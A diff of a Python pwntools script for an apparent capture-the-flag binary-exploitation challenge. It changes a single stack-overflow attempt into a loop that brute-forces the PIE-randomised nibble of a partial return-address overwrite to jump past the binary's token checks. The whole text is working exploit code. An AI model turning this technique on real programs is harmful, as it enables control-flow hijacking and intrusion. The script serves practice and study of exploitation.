@@ -11,15 +11,25 @@ from pwn import *
     IBT:        Enabled
     Stripped:   No
 '''
-r = process('/challenge/binary-exploitation-pie-overflow')
-save_addr = 0x21c6
+i = 0
 #0000000000002140 <main>:
-main_offset = 0x2140
-win_offset = 0x1f37
-offset = 0x60 + 8
-payload = offset * b'A' + b'\x37\x1f' #+ b'\x21'
-print(r.recvline().decode())
-r.send(payload )
-r.interactive()
-# main + 0x86
+for i in "0123456789abcdef":
+    r = process('/challenge/binary-exploitation-pie-overflow')
+    print(r.recvline())
+    save_addr = 0x21c6
+    main_offset = 0x2140
+    win_offset = 0x1f37
+    offset = 0x60 + 8
+    payload = offset * b'A' + b'\x53' + bytes.fromhex(f"{i}f")# skiiping the token checks
+    print(r.recvline_contains('Send', timeout=0.5).decode())
+    r.send(payload )
+    try:
+        line = r.recvline().decode()
+        line += r.recvline().decode()
+        line += r.recvline().decode()
+    except:
+        line = 'no line'
+    
+    print('i  ' + str(i) + '   ' + line )
+    # main + 0x86
 
